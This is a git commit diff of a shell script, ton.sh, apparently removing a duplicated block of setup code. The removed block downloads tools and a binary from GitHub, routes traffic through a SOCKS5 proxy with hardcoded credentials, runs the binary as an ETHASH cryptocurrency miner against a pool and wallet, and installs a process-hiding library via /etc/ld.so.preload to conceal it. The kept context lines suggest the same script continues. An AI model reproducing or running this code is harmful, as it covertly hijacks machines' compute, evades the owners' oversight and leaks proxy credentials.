d10a7edb696347b1d8d688ca44fe450813b9e391
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-04-25 09:08:36 -0600

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -2,59 +2,6 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 45.86.71.9:6269
-socks5_username = tahugoreng
-socks5_password = dadakan123
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
-chmod +x priyatama
-POOL=stratum+tcp://ethash.poolbinance.com:443
-WALLET=teguhcong
-WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
-
-./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
-unzip magicPriyatama.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
-
-
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
